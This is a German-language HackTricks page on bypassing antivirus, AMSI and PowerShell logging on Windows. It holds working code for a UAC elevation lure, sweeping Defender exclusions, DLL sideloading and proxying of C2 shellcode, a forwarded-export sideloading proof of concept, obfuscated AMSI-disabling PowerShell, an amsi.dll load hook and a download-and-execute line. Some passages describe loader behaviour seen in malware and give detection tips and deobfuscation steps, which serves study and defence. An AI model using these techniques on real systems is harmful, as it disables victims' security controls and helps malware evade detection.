# Antivirus (AV) Bypass

{{#include ../banners/hacktricks-training.md}}

**Diese Seite wurde geschrieben von** [**@m2rc_p**](https://twitter.com/m2rc_p)**!**

## Defender stoppen

- [defendnot](https://github.com/es3n1n/defendnot): Ein Tool, um Windows Defender außer Funktion zu setzen.
- [no-defender](https://github.com/es3n1n/no-defender): Ein Tool, das Windows Defender außer Funktion setzt, indem es ein anderes AV vortäuscht.
- [Disable Defender if you are admin](basic-powershell-for-pentesters/README.md)

### Installer-artiger UAC-Köder, bevor Defender manipuliert wird

Öffentlich verfügbare Loader, die sich als Game-Cheats tarnen, werden häufig als unsignierte Node.js/Nexe-Installer verteilt, die zuerst **den Benutzer um erhöhte Rechte bitten** und erst danach Defender außer Kraft setzen. Der Ablauf ist einfach:

1. Mit `net session` auf administrativen Kontext prüfen. Der Befehl gelingt nur, wenn der Aufrufer Administratorrechte hat; ein Fehlschlag zeigt, dass der Loader als Standardbenutzer läuft.
2. Sich sofort mit dem `RunAs`-Verb neu starten, um die erwartete UAC-Zustimmungsaufforderung auszulösen, während die ursprüngliche Kommandozeile erhalten bleibt.
```powershell
if (-not (net session 2>$null)) {
powershell -WindowStyle Hidden -Command "Start-Process cmd.exe -Verb RunAs -WindowStyle Hidden -ArgumentList '/c ""`<path_to_loader`>""'"
exit
}
```
Opfer glauben bereits, dass sie „gecrackte“ Software installieren, daher wird die Aufforderung meist akzeptiert und verschafft der Malware die Rechte, die sie benötigt, um Defenders Richtlinie zu ändern.

### Pauschale `MpPreference`-Ausnahmen für jeden Laufwerksbuchstaben

Sobald erhöhte Rechte vorliegen, maximieren GachiLoader-style-Ketten Defenders Blindenflecken, anstatt den Dienst vollständig zu deaktivieren. Der Loader beendet zuerst den GUI-Watchdog (`taskkill /F /IM SecHealthUI.exe`) und setzt dann **sehr weitreichende Ausnahmen**, sodass jedes Benutzerprofil, jedes Systemverzeichnis und jedes Wechsellaufwerk nicht mehr gescannt werden kann:
```powershell
$targets = @('C:\Users\', 'C:\ProgramData\', 'C:\Windows\')
Get-PSDrive -PSProvider FileSystem | ForEach-Object { $targets += $_.Root }
$targets | Sort-Object -Unique | ForEach-Object { Add-MpPreference -ExclusionPath $_ }
Add-MpPreference -ExclusionExtension '.sys'
```
Wichtige Beobachtungen:

- Die Schleife durchsucht jedes eingehängte Dateisystem (D:\, E:\, USB-Sticks usw.), daher wird **jedes zukünftig irgendwo auf der Festplatte abgelegte payload ignoriert**.
- Die Ausschlussregel für die Erweiterung `.sys` ist zukunftsorientiert — Angreifer behalten sich die Option vor, später nicht signierte Treiber zu laden, ohne Defender erneut zu berühren.
- Alle Änderungen landen unter `HKLM\SOFTWARE\Microsoft\Windows Defender\Exclusions`, sodass spätere Stufen bestätigen können, dass die Ausschlüsse bestehen bleiben oder sie erweitern können, ohne UAC erneut auszulösen.

Weil kein Defender-Dienst gestoppt wird, melden naive Health-Checks weiterhin “antivirus active”, obwohl die Echtzeitüberprüfung diese Pfade nie anfasst.

## **AV Evasion Methodology**

Derzeit verwenden AVs verschiedene Methoden, um zu prüfen, ob eine Datei bösartig ist oder nicht: static detection, dynamic analysis und bei den fortgeschritteneren EDRs Verhaltensanalyse.

### **Static detection**

Static detection erfolgt, indem bekannte bösartige strings oder arrays of bytes in einem binary oder script markiert werden, und indem Informationen aus der Datei selbst extrahiert werden (z. B. file description, company name, digital signatures, icon, checksum usw.). Das bedeutet, dass die Verwendung bekannter public tools dich eher erwischen kann, da diese wahrscheinlich bereits analysiert und als bösartig markiert wurden. Es gibt ein paar Möglichkeiten, diese Art der Erkennung zu umgehen:

- **Encryption**

Wenn du das binary verschlüsselst, gibt es für AV im Grunde keine Möglichkeit, dein Programm zu erkennen, aber du brauchst irgendeinen loader, um es im memory zu entschlüsseln und auszuführen.

- **Obfuscation**

Manchmal reicht es, ein paar strings in deinem binary oder script zu ändern, um an AV vorbeizukommen, aber das kann je nachdem, was du obfuskieren willst, zeitaufwendig sein.

- **Custom tooling**

Wenn du eigene tools entwickelst, gibt es keine bekannten schlechten Signaturen, aber das kostet viel Zeit und Aufwand.

> [!TIP]
> A good way for checking against Windows Defender static detection is [ThreatCheck](https://github.com/rasta-mouse/ThreatCheck). It basically splits the file into multiple segments and then tasks Defender to scan each one individually, this way, it can tell you exactly what are the flagged strings or bytes in your binary.

Ich empfehle dringend, dir diese [YouTube playlist](https://www.youtube.com/playlist?list=PLj05gPj8rk_pkb12mDe4PgYZ5qPxhGKGf) über praktische AV Evasion anzuschauen.

### **Dynamic analysis**

Dynamic analysis ist, wenn AV dein binary in einer sandbox ausführt und nach bösartigem Verhalten sucht (z. B. versucht, die Passwörter deines Browsers zu entschlüsseln und auszulesen, einen minidump von LSASS anzufertigen, etc.). Dieser Teil kann etwas kniffliger sein, aber hier sind einige Dinge, die du tun kannst, um Sandboxes zu umgehen.

- **Sleep before execution** Je nach Implementierung kann das eine gute Methode sein, die dynamic analysis von AV zu umgehen. AVs haben nur sehr wenig Zeit, Dateien zu scannen, um den Workflow des Nutzers nicht zu unterbrechen, daher können lange sleeps die Analyse von binaries stören. Das Problem ist, dass viele AV-sandboxes den Sleep je nach Implementierung einfach überspringen können.
- **Checking machine's resources** Üblicherweise haben Sandboxes nur sehr geringe Ressourcen zur Verfügung (z. B. < 2GB RAM), sonst würden sie die Maschine des Nutzers verlangsamen. Du kannst hier auch sehr kreativ werden, z. B. indem du die CPU-Temperatur oder sogar die Lüftergeschwindigkeiten prüfst — nicht alles wird in der sandbox implementiert.
- **Machine-specific checks** Wenn du einen Nutzer anvisieren willst, dessen Workstation der Domain "contoso.local" beigetreten ist, kannst du die Computer-Domain prüfen; wenn sie nicht übereinstimmt, kannst du dein Programm beenden.

Es stellt sich heraus, dass der Computername der Microsoft Defender Sandbox HAL9TH ist. Du kannst also den Computername in deiner malware vor der Detonation prüfen; wenn der Name HAL9TH ist, befindest du dich in der defender sandbox und kannst dein Programm beenden.

<figure><img src="../images/image (209).png" alt=""><figcaption><p>Quelle: <a href="https://youtu.be/StSLxFbVz0M?t=1439">https://youtu.be/StSLxFbVz0M?t=1439</a></p></figcaption></figure>

Einige weitere sehr gute Tipps von [@mgeeky](https://twitter.com/mariuszbit) für den Umgang mit Sandboxes

<figure><img src="../images/image (248).png" alt=""><figcaption><p><a href="https://discord.com/servers/red-team-vx-community-1012733841229746240">Red Team VX Discord</a> #malware-dev channel</p></figcaption></figure>

Wie schon zuvor gesagt: **public tools** werden früher oder später **get detected**, also solltest du dir folgende Frage stellen:

Zum Beispiel: Wenn du LSASS dumpen willst, **musst du wirklich mimikatz verwenden**? Oder könntest du ein anderes, weniger bekanntes Projekt nutzen, das ebenfalls LSASS dumpen kann?

Die richtige Antwort ist wahrscheinlich Letzteres. Am Beispiel von mimikatz: Es ist wahrscheinlich eines der — wenn nicht das — am häufigsten von AVs und EDRs markierten Tools; obwohl das Projekt an sich super ist, ist es ein Alptraum, damit AVs zu umgehen. Such also nach Alternativen für das, was du erreichen willst.

> [!TIP]
> When modifying your payloads for evasion, make sure to **turn off automatic sample submission** in defender, and please, seriously, **DO NOT UPLOAD TO VIRUSTOTAL** if your goal is achieving evasion in the long run. If you want to check if your payload gets detected by a particular AV, install it on a VM, try to turn off the automatic sample submission, and test it there until you're satisfied with the result.

## EXEs vs DLLs

Wann immer möglich, priorisiere immer **die Verwendung von DLLs für Evasion**. Meiner Erfahrung nach werden DLL files in der Regel **way less detected** und analysiert, daher ist das ein sehr einfacher Trick, um in manchen Fällen Erkennung zu vermeiden (vorausgesetzt, dein payload kann natürlich als DLL ausgeführt werden).

Wie im Bild zu sehen, hat ein DLL Payload von Havoc eine Detection-Rate von 4/26 bei antiscan.me, während der EXE-Payload eine Detection-Rate von 7/26 hat.

<figure><img src="../images/image (1130).png" alt=""><figcaption><p>antiscan.me-Vergleich eines normalen Havoc EXE-Payloads vs einer normalen Havoc DLL</p></figcaption></figure>

Jetzt zeigen wir einige Tricks, die du mit DLL files verwenden kannst, um deutlich stealthier zu sein.

## DLL Sideloading & Proxying

**DLL Sideloading** nutzt die DLL search order des loaders aus, indem die victim application und die malicious payload(s) nebeneinander positioniert werden.

Du kannst nach Programmen suchen, die für DLL Sideloading anfällig sind, mit [Siofra](https://github.com/Cybereason/siofra) und folgendem powershell-Skript:
```bash
Get-ChildItem -Path "C:\Program Files\" -Filter *.exe -Recurse -File -Name| ForEach-Object {
$binarytoCheck = "C:\Program Files\" + $_
C:\Users\user\Desktop\Siofra64.exe --mode file-scan --enum-dependency --dll-hijack -f $binarytoCheck
}
```
Dieser Befehl gibt die Liste der Programme aus, die für DLL hijacking anfällig sind im Ordner "C:\Program Files\\" sowie die DLL-Dateien, die sie zu laden versuchen.

Ich empfehle dringend, dass du **DLL Hijackable/Sideloadable programs selbst erkundest**; diese Technik ist bei korrekter Anwendung ziemlich stealthy, aber wenn du öffentlich bekannte DLL Sideloadable programs verwendest, kannst du leicht erwischt werden.

Nur dadurch, eine bösartige DLL mit dem Namen zu platzieren, den ein Programm zu laden erwartet, wird dein payload nicht ausgeführt, da das Programm bestimmte Funktionen in dieser DLL erwartet. Um dieses Problem zu beheben, verwenden wir eine andere Technik namens **DLL Proxying/Forwarding**.

**DLL Proxying** leitet die Aufrufe, die ein Programm an die Proxy-(und bösartige) DLL richtet, an die originale DLL weiter, wodurch die Funktionalität des Programms erhalten bleibt und gleichzeitig die Ausführung deines payloads ermöglicht wird.

Ich werde das Projekt [SharpDLLProxy](https://github.com/Flangvik/SharpDllProxy) von [@flangvik](https://twitter.com/Flangvik/) verwenden.

Das sind die Schritte, die ich befolgt habe:
```
1. Find an application vulnerable to DLL Sideloading (siofra or using Process Hacker)
2. Generate some shellcode (I used Havoc C2)
3. (Optional) Encode your shellcode using Shikata Ga Nai (https://github.com/EgeBalci/sgn)
4. Use SharpDLLProxy to create the proxy dll (.\SharpDllProxy.exe --dll .\mimeTools.dll --payload .\demon.bin)
```
Der letzte Befehl liefert uns 2 Dateien: eine DLL-Quellcodevorlage und die ursprüngliche, umbenannte DLL.

<figure><img src="../images/sharpdllproxy.gif" alt=""><figcaption></figcaption></figure>
```
5. Create a new visual studio project (C++ DLL), paste the code generated by SharpDLLProxy (Under output_dllname/dllname_pragma.c) and compile. Now you should have a proxy dll which will load the shellcode you've specified and also forward any calls to the original DLL.
```
Das sind die Ergebnisse:

<figure><img src="../images/dll_sideloading_demo.gif" alt=""><figcaption></figcaption></figure>

Sowohl unser shellcode (mit [SGN](https://github.com/EgeBalci/sgn) kodiert) als auch die proxy DLL haben eine 0/26 Detection-Rate auf [antiscan.me](https://antiscan.me)! Das nenne ich einen Erfolg.

<figure><img src="../images/image (193).png" alt=""><figcaption></figcaption></figure>

> [!TIP]
> Ich **empfehle dringend**, dass du dir [S3cur3Th1sSh1t's twitch VOD](https://www.twitch.tv/videos/1644171543) über DLL Sideloading und auch [ippsec's video](https://www.youtube.com/watch?v=3eROsG_WNpE) ansiehst, um mehr über das, was wir ausführlicher besprochen haben, zu lernen.

### Abusing Forwarded Exports (ForwardSideLoading)

Windows PE modules can export functions that are actually "forwarders": instead of pointing to code, the export entry contains an ASCII string of the form `TargetDll.TargetFunc`. When a caller resolves the export, the Windows loader will:

- Lädt `TargetDll`, falls es nicht bereits geladen ist
- Löst `TargetFunc` daraus auf

Key behaviors to understand:
- Wenn `TargetDll` eine KnownDLL ist, wird sie aus dem geschützten KnownDLLs namespace bereitgestellt (z. B. ntdll, kernelbase, ole32).
- Wenn `TargetDll` keine KnownDLL ist, wird die normale DLL-Suchreihenfolge verwendet, die das Verzeichnis des Moduls einschließt, das die Forward-Auflösung durchführt.

This enables an indirect sideloading primitive: find a signed DLL that exports a function forwarded to a non-KnownDLL module name, then co-locate that signed DLL with an attacker-controlled DLL named exactly as the forwarded target module. When the forwarded export is invoked, the loader resolves the forward and loads your DLL from the same directory, executing your DllMain.

Example observed on Windows 11:
```
keyiso.dll KeyIsoSetAuditingInterface -> NCRYPTPROV.SetAuditingInterface
```
`NCRYPTPROV.dll` ist kein KnownDLL, daher wird es über die normale Suchreihenfolge aufgelöst.

PoC (copy-paste):
1) Kopiere die signierte System-DLL in einen beschreibbaren Ordner
```
copy C:\Windows\System32\keyiso.dll C:\test\
```
2) Lege eine bösartige `NCRYPTPROV.dll` im selben Ordner ab. Ein minimales DllMain reicht aus, um code execution zu erreichen; du musst die forwarded function nicht implementieren, um DllMain auszulösen.
```c
// x64: x86_64-w64-mingw32-gcc -shared -o NCRYPTPROV.dll ncryptprov.c
#include <windows.h>
BOOL WINAPI DllMain(HINSTANCE hinst, DWORD reason, LPVOID reserved){
if (reason == DLL_PROCESS_ATTACH){
HANDLE h = CreateFileA("C\\\\test\\\\DLLMain_64_DLL_PROCESS_ATTACH.txt", GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
if(h!=INVALID_HANDLE_VALUE){ const char *m = "hello"; DWORD w; WriteFile(h,m,5,&w,NULL); CloseHandle(h);}
}
return TRUE;
}
```
3) Die Weiterleitung mit einem signierten LOLBin auslösen:
```
rundll32.exe C:\test\keyiso.dll, KeyIsoSetAuditingInterface
```
Beobachtetes Verhalten:
- rundll32 (signiert) lädt die side-by-side `keyiso.dll` (signiert)
- Während der Auflösung von `KeyIsoSetAuditingInterface` folgt der Loader der Weiterleitung zu `NCRYPTPROV.SetAuditingInterface`
- Anschließend lädt der Loader `NCRYPTPROV.dll` aus `C:\test` und führt dessen `DllMain` aus
- Wenn `SetAuditingInterface` nicht implementiert ist, erhält man erst nach Ausführung von `DllMain` einen "missing API"-Fehler

Hunting-Tipps:
- Konzentriere dich auf weitergeleitete Exporte, bei denen das Zielmodul kein KnownDLL ist. KnownDLLs sind aufgelistet unter `HKLM\SYSTEM\CurrentControlSet\Control\Session Manager\KnownDLLs`.
- Du kannst weitergeleitete Exporte mit Tools wie zum Beispiel auflisten:
```
dumpbin /exports C:\Windows\System32\keyiso.dll
# forwarders appear with a forwarder string e.g., NCRYPTPROV.SetAuditingInterface
```
- Siehe das Windows 11 Forwarder-Inventar, um Kandidaten zu finden: https://hexacorn.com/d/apis_fwd.txt

Erkennungs- und Verteidigungsansätze:
- Überwache LOLBins (z. B. rundll32.exe), die signierte DLLs aus Nicht-Systempfaden laden, gefolgt vom Laden non-KnownDLLs mit demselben Basisnamen aus diesem Verzeichnis
- Alarm bei Prozess-/Modulketten wie: `rundll32.exe` → non-system `keyiso.dll` → `NCRYPTPROV.dll` unter benutzerschreibbaren Pfaden
- Durchsetze Code-Integritätsrichtlinien (WDAC/AppLocker) und verbiete Schreib- und Ausführungsrechte in Anwendungsverzeichnissen

## [**Freeze**](https://github.com/optiv/Freeze)

`Freeze is a payload toolkit for bypassing EDRs using suspended processes, direct syscalls, and alternative execution methods`

Du kannst Freeze verwenden, um deinen shellcode auf unauffällige Weise zu laden und auszuführen.
```
Git clone the Freeze repo and build it (git clone https://github.com/optiv/Freeze.git && cd Freeze && go build Freeze.go)
1. Generate some shellcode, in this case I used Havoc C2.
2. ./Freeze -I demon.bin -encrypt -O demon.exe
3. Profit, no alerts from defender
```
<figure><img src="../images/freeze_demo_hacktricks.gif" alt=""><figcaption></figcaption></figure>

> [!TIP]
> Evasion ist nur ein Katz-und-Maus-Spiel: Was heute funktioniert, könnte morgen entdeckt werden, also verlasse dich niemals nur auf ein Tool; wenn möglich, versuche mehrere Evasion-Techniken zu verketten.

## AMSI (Anti-Malware Scan Interface)

AMSI wurde entwickelt, um "[fileless malware](https://en.wikipedia.org/wiki/Fileless_malware)" zu verhindern. Ursprünglich konnten AVs nur **Dateien auf der Festplatte** scannen, sodass, wenn man Payloads **directly in-memory** ausführte, der AV nichts dagegen tun konnte, da er nicht genügend Sichtbarkeit hatte.

Die AMSI-Funktion ist in folgende Windows-Komponenten integriert.

- User Account Control, oder UAC (Elevation von EXE, COM, MSI oder ActiveX-Installationen)
- PowerShell (Skripte, interaktive Nutzung und dynamische Codeauswertung)
- Windows Script Host (wscript.exe und cscript.exe)
- JavaScript und VBScript
- Office VBA macros

Es ermöglicht Antivirenlösungen, das Verhalten von Skripten zu untersuchen, indem Skriptinhalte in unverschlüsselter und nicht obfuskierter Form offengelegt werden.

Das Ausführen von `IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/PowerView.ps1')` wird die folgende Warnung bei Windows Defender erzeugen.

<figure><img src="../images/image (1135).png" alt=""><figcaption></figcaption></figure>

Beachte, wie es `amsi:` voranstellt und dann den Pfad zur ausführbaren Datei angibt, von der das Skript ausgeführt wurde — in diesem Fall powershell.exe

Wir haben keine Datei auf die Festplatte geschrieben, wurden aber trotzdem aufgrund von AMSI im Speicher entdeckt.

Außerdem wird ab **.NET 4.8** auch C#-Code durch AMSI geprüft. Das betrifft sogar `Assembly.Load(byte[])` für in-memory Ausführung. Deshalb wird empfohlen, ältere .NET-Versionen (z. B. 4.7.2 oder älter) für in-memory Ausführung zu verwenden, wenn man AMSI umgehen möchte.

Es gibt mehrere Wege, AMSI zu umgehen:

- **Obfuscation**

Da AMSI hauptsächlich mit statischen Erkennungen arbeitet, kann das Modifizieren der Skripte, die man zu laden versucht, ein guter Weg sein, der Erkennung zu entgehen.

Allerdings hat AMSI die Fähigkeit, Skripte selbst bei mehreren Obfuskierungsschichten zu deobfuskieren, sodass Obfuscation je nach Umsetzung eine schlechte Option sein kann. Das macht das Umgehen nicht besonders trivial. Manchmal reicht es jedoch, ein paar Variablennamen zu ändern, und man ist durch — es hängt also davon ab, wie stark etwas markiert wurde.

- **AMSI Bypass**

Da AMSI durch das Laden einer DLL in den powershell- (auch cscript.exe, wscript.exe, etc.) Prozess implementiert ist, ist es selbst aus einem unprivilegierten Benutzerkontext leicht möglich, daran zu manipulieren. Aufgrund dieses Implementierungsfehlers haben Forscher mehrere Methoden gefunden, AMSI-Scans zu umgehen.

**Forcing an Error**

Wenn man die AMSI-Initialisierung zum Fehlschlagen bringt (amsiInitFailed), wird für den aktuellen Prozess kein Scan gestartet. Ursprünglich wurde dies von [Matt Graeber](https://twitter.com/mattifestation) veröffentlicht, und Microsoft hat eine Signatur entwickelt, um eine breitere Nutzung zu verhindern.
```bash
[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)
```
Es genügte eine einzige Zeile powershell-Code, um AMSI für den aktuellen powershell-Prozess unbrauchbar zu machen. Diese Zeile wurde natürlich von AMSI selbst erkannt, daher ist eine Modifikation nötig, um diese Technik zu nutzen.

Hier ist ein modifizierter AMSI bypass, den ich aus diesem [Github Gist](https://gist.github.com/r00t-3xp10it/a0c6a368769eec3d3255d4814802b5db) übernommen habe.
```bash
Try{#Ams1 bypass technic nº 2
$Xdatabase = 'Utils';$Homedrive = 'si'
$ComponentDeviceId = "N`onP" + "ubl`ic" -join ''
$DiskMgr = 'Syst+@.MÂ£nÂ£g' + 'e@+nt.Auto@' + 'Â£tion.A' -join ''
$fdx = '@ms' + 'Â£InÂ£' + 'tF@Â£' + 'l+d' -Join '';Start-Sleep -Milliseconds 300
$CleanUp = $DiskMgr.Replace('@','m').Replace('Â£','a').Replace('+','e')
$Rawdata = $fdx.Replace('@','a').Replace('Â£','i').Replace('+','e')
$SDcleanup = [Ref].Assembly.GetType(('{0}m{1}{2}' -f $CleanUp,$Homedrive,$Xdatabase))
$Spotfix = $SDcleanup.GetField($Rawdata,"$ComponentDeviceId,Static")
$Spotfix.SetValue($null,$true)
}Catch{Throw $_}
```
Beachte, dass dies wahrscheinlich auffallen wird, sobald dieser Beitrag veröffentlicht wird. Wenn du unentdeckt bleiben willst, solltest du daher keinen Code veröffentlichen.

Memory Patching

Diese Technik wurde ursprünglich von [@RastaMouse](https://twitter.com/_RastaMouse/) entdeckt und besteht darin, die Adresse der Funktion "AmsiScanBuffer" in amsi.dll (zuständig für das Scannen der vom Benutzer gelieferten Eingaben) zu finden und sie mit Anweisungen zu überschreiben, die den Rückgabecode E_INVALIDARG liefern. Auf diese Weise gibt der eigentliche Scan 0 zurück, was als sauberer Befund interpretiert wird.

> [!TIP]
> Bitte lies [https://rastamouse.me/memory-patching-amsi-bypass/](https://rastamouse.me/memory-patching-amsi-bypass/) für eine ausführlichere Erklärung.

Es gibt außerdem viele weitere Techniken, um AMSI mit powershell zu umgehen — schau dir [**this page**](basic-powershell-for-pentesters/index.html#amsi-bypass) und [**this repo**](https://github.com/S3cur3Th1sSh1t/Amsi-Bypass-Powershell) an, um mehr darüber zu erfahren.

### Blockieren von AMSI durch Verhindern des Ladens von amsi.dll (LdrLoadDll hook)

AMSI wird erst initialisiert, nachdem `amsi.dll` in den aktuellen Prozess geladen wurde. Ein robuster, sprachunabhängiger Bypass besteht darin, einen user‑mode hook auf `ntdll!LdrLoadDll` zu setzen, der einen Fehler zurückgibt, wenn das angeforderte Modul `amsi.dll` ist. Infolgedessen lädt AMSI nie und es finden für diesen Prozess keine Scans statt.

Implementierungsübersicht (x64 C/C++ pseudocode):
```c
#include <windows.h>
#include <winternl.h>

typedef NTSTATUS (NTAPI *pLdrLoadDll)(PWSTR, ULONG, PUNICODE_STRING, PHANDLE);
static pLdrLoadDll realLdrLoadDll;

NTSTATUS NTAPI Hook_LdrLoadDll(PWSTR path, ULONG flags, PUNICODE_STRING module, PHANDLE handle){
if (module && module->Buffer){
UNICODE_STRING amsi; RtlInitUnicodeString(&amsi, L"amsi.dll");
if (RtlEqualUnicodeString(module, &amsi, TRUE)){
// Pretend the DLL cannot be found → AMSI never initialises in this process
return STATUS_DLL_NOT_FOUND; // 0xC0000135
}
}
return realLdrLoadDll(path, flags, module, handle);
}

void InstallHook(){
HMODULE ntdll = GetModuleHandleW(L"ntdll.dll");
realLdrLoadDll = (pLdrLoadDll)GetProcAddress(ntdll, "LdrLoadDll");
// Apply inline trampoline or IAT patching to redirect to Hook_LdrLoadDll
// e.g., Microsoft Detours / MinHook / custom 14‑byte jmp thunk
}
```
Hinweise
- Funktioniert sowohl mit PowerShell, WScript/CScript als auch mit eigenen Loadern (alles, was sonst AMSI laden würde).
- Kombiniere dies mit dem Einlesen von Skripten über stdin (`PowerShell.exe -NoProfile -NonInteractive -Command -`), um lange Kommandozeilen‑Artefakte zu vermeiden.
- Wird bei Loadern beobachtet, die über LOLBins ausgeführt werden (z. B. `regsvr32`, das `DllRegisterServer` aufruft).

Dieses Tool [https://github.com/Flangvik/AMSI.fail](https://github.com/Flangvik/AMSI.fail) generiert ebenfalls Skripte, um AMSI zu umgehen.

**Die erkannte Signatur entfernen**

Du kannst ein Tool wie **[https://github.com/cobbr/PSAmsi](https://github.com/cobbr/PSAmsi)** und **[https://github.com/RythmStick/AMSITrigger](https://github.com/RythmStick/AMSITrigger)** verwenden, um die erkannte AMSI‑Signatur aus dem Speicher des aktuellen Prozesses zu entfernen. Diese Tools scannen den Speicher des aktuellen Prozesses nach der AMSI‑Signatur und überschreiben sie dann mit NOP‑Instruktionen, wodurch sie effektiv aus dem Speicher entfernt wird.

**AV/EDR-Produkte, die AMSI verwenden**

Eine Liste von AV/EDR‑Produkten, die AMSI verwenden, findest du in **[https://github.com/subat0mik/whoamsi](https://github.com/subat0mik/whoamsi)**.

**PowerShell Version 2 verwenden**
Wenn du PowerShell Version 2 verwendest, wird AMSI nicht geladen, sodass du deine Skripte ausführen kannst, ohne von AMSI gescannt zu werden. Du kannst dies tun:
```bash
powershell.exe -version 2
```
## PS Logging

PowerShell-Logging ist eine Funktion, die es erlaubt, alle auf einem System ausgeführten PowerShell-Befehle zu protokollieren. Das kann für Audit- und Troubleshooting-Zwecke nützlich sein, kann aber auch ein **Problem für Angreifer darstellen, die der Erkennung entgehen wollen**.

Um PowerShell-Logging zu umgehen, können Sie folgende Techniken benutzen:

- **Disable PowerShell Transcription and Module Logging**: Sie können ein Tool wie [https://github.com/leechristensen/Random/blob/master/CSharp/DisablePSLogging.cs](https://github.com/leechristensen/Random/blob/master/CSharp/DisablePSLogging.cs) dafür verwenden.
- **Use Powershell version 2**: Wenn Sie PowerShell Version 2 verwenden, wird AMSI nicht geladen, sodass Sie Ihre Skripte ohne AMSI-Scan ausführen können. So geht’s: `powershell.exe -version 2`
- **Use an Unmanaged Powershell Session**: Verwenden Sie [https://github.com/leechristensen/UnmanagedPowerShell](https://github.com/leechristensen/UnmanagedPowerShell), um eine powershell ohne Verteidigungen zu starten (das ist das, was `powerpick` von Cobal Strike verwendet).


## Obfuscation

> [!TIP]
> Mehrere Obfuscation-Techniken basieren auf der Verschlüsselung von Daten, wodurch die Entropie der Binärdatei erhöht wird — das macht es AVs und EDRs leichter, diese zu erkennen. Seien Sie vorsichtig damit und wenden Sie Verschlüsselung eventuell nur auf spezifische, sensitive Bereiche Ihres Codes an, die verborgen werden müssen.

### Deobfuscating ConfuserEx-Protected .NET Binaries

Bei der Analyse von Malware, die ConfuserEx 2 (oder kommerzielle Forks) verwendet, trifft man häufig auf mehrere Schutzschichten, die Decompiler und Sandboxes blockieren. Der untenstehende Workflow stellt zuverlässig ein nahezu originales IL wieder her, das anschließend in C# mit Tools wie dnSpy oder ILSpy dekompiliert werden kann.

1.  Anti-tampering removal – ConfuserEx verschlüsselt jeden *method body* und entschlüsselt ihn im statischen Modul-Konstruktor (`<Module>.cctor`). Das patcht außerdem die PE-Checksum, sodass jede Modifikation die Binärdatei abstürzen lässt. Verwenden Sie **AntiTamperKiller**, um die verschlüsselten Metadatentabellen zu lokalisieren, die XOR-Keys wiederherzustellen und eine saubere Assembly zu schreiben:
```bash
# https://github.com/wwh1004/AntiTamperKiller
python AntiTamperKiller.py Confused.exe Confused.clean.exe
```
Die Ausgabe enthält die 6 Anti-Tamper-Parameter (`key0-key3`, `nameHash`, `internKey`), die beim Erstellen eines eigenen Unpackers nützlich sein können.

2.  Symbol / control-flow recovery – geben Sie die *saubere* Datei an **de4dot-cex** (ein ConfuserEx-aware Fork von de4dot):
```bash
de4dot-cex -p crx Confused.clean.exe -o Confused.de4dot.exe
```
Flags:
• `-p crx` – wählt das ConfuserEx 2 Profil  
• de4dot macht control-flow flattening rückgängig, stellt originale Namespaces, Klassen- und Variablennamen wieder her und entschlüsselt konstante Strings.

3.  Proxy-call stripping – ConfuserEx ersetzt direkte Methodenaufrufe durch leichte Wrapper (auch *proxy calls* genannt), um die Dekompilierung weiter zu erschweren. Entfernen Sie diese mit **ProxyCall-Remover**:
```bash
ProxyCall-Remover.exe Confused.de4dot.exe Confused.fixed.exe
```
Nach diesem Schritt sollten Sie normale .NET-APIs wie `Convert.FromBase64String` oder `AES.Create()` statt undurchsichtiger Wrapper-Funktionen (`Class8.smethod_10`, …) sehen.

4.  Manuelle Bereinigung – führen Sie die resultierende Binärdatei in dnSpy aus, suchen Sie nach großen Base64-Blobs oder nach Verwendung von `RijndaelManaged`/`TripleDESCryptoServiceProvider`, um das *richtige* Payload zu finden. Oft speichert die Malware dieses als TLV-codiertes Byte-Array, initialisiert innerhalb von `<Module>.byte_0`.

Die obige Kette stellt den Ausführungsfluss **her**, ohne die bösartige Probe ausführen zu müssen – nützlich bei Arbeiten auf einer Offline-Workstation.

> 🛈  ConfuserEx erzeugt ein Custom-Attribut namens `ConfusedByAttribute`, das als IOC verwendet werden kann, um Samples automatisch zu triagieren.

#### Einzeiler
```bash
autotok.sh Confused.exe  # wrapper that performs the 3 steps above sequentially
```
---

- [**InvisibilityCloak**](https://github.com/h4wkst3r/InvisibilityCloak)**: C# obfuscator**
- [**Obfuscator-LLVM**](https://github.com/obfuscator-llvm/obfuscator): Ziel dieses Projekts ist es, einen Open-Source-Fork der [LLVM](http://www.llvm.org/) Compiler-Suite bereitzustellen, der erhöhte Softwaresicherheit durch [code obfuscation](<http://en.wikipedia.org/wiki/Obfuscation_(software)>) und Manipulationsschutz bietet.
- [**ADVobfuscator**](https://github.com/andrivet/ADVobfuscator): ADVobfuscator demonstriert, wie man die Sprache `C++11/14` verwendet, um zur Kompilierzeit obfuskierten Code zu erzeugen, ohne ein externes Tool zu nutzen und ohne den Compiler zu modifizieren.
- [**obfy**](https://github.com/fritzone/obfy): Fügt eine Schicht aus obfuskierten Operationen hinzu, die durch das C++ Template-Metaprogramming-Framework generiert werden und das Leben der Person, die versucht, die Anwendung zu knacken, etwas erschweren.
- [**Alcatraz**](https://github.com/weak1337/Alcatraz)**:** Alcatraz ist ein x64 Binary-Obfuscator, der verschiedene PE-Dateien obfuskieren kann, einschließlich: .exe, .dll, .sys
- [**metame**](https://github.com/a0rtega/metame): Metame ist eine einfache metamorphe Code-Engine für beliebige Executables.
- [**ropfuscator**](https://github.com/ropfuscator/ropfuscator): ROPfuscator ist ein fein granuliertes Code-Obfuscation-Framework für LLVM-unterstützte Sprachen unter Verwendung von ROP (return-oriented programming). ROPfuscator obfuskiert ein Programm auf Assemblerebene, indem reguläre Instruktionen in ROP-Chains umgewandelt werden und so unsere natürliche Vorstellung von normalem Kontrollfluss untergraben.
- [**Nimcrypt**](https://github.com/icyguider/nimcrypt): Nimcrypt ist ein .NET PE Crypter, geschrieben in Nim
- [**inceptor**](https://github.com/klezVirus/inceptor)**:** Inceptor kann bestehende EXE/DLL in Shellcode konvertieren und diese dann laden

## SmartScreen & MoTW

Möglicherweise hast du diesen Bildschirm gesehen, wenn du ausführbare Dateien aus dem Internet heruntergeladen und ausgeführt hast.

Microsoft Defender SmartScreen ist ein Sicherheitsmechanismus, der den Endanwender davor schützen soll, potenziell bösartige Anwendungen auszuführen.

<figure><img src="../images/image (664).png" alt=""><figcaption></figcaption></figure>

